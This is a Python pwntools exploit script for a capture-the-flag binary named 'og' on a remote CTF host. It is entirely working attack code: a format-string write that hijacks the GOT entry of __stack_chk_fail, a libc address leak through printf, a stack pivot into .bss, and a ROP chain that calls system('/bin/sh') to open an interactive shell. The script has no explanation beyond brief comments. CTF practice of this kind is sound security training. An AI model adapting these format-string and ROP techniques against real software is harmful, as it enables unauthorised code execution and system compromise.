#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './og'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challs.actf.co', 31312

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x0401239
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec og
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000

def exploit():
    global io
    io = initialize()

    payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.sym['main']})
    io.sendlineafter(b'name: ', payload)

    payload = ( b'%7$s'.ljust(8, b'\x00') + p64(elf.got['printf']) ).ljust(64, b'\x00')
    io.sendlineafter(b'name: ', payload)
    io.recvuntil(b'around, ')
    leak = u64(io.recvuntil(b'kill', drop=True).ljust(8, b'\x00'))
    
    libc.address = leak - libc.sym['printf']

    payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: 0x401254}, write_size='short') # ret
    payload += p64(0x0) + p64(elf.bss() + 0x700) + p64(0x401201) # pivot bss + fgets@sym.go
    io.sendlineafter(b'name: ', payload)

    rop = ROP(libc)
    pop_rsp = rop.find_gadget(['pop rsp', 'ret']).address
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address  
    shell = p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(0x401254) + p64(libc.sym['system'])
    
    payload = b'\x00' * 8
    payload += shell
    payload += b'\x00' * ((56-8) - len(payload))
    payload += p64(elf.bss() + 0x700 - 0x30) # rop payload
    payload += p64(0x401253) # leave ; ret
    io.sendline(payload)

    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()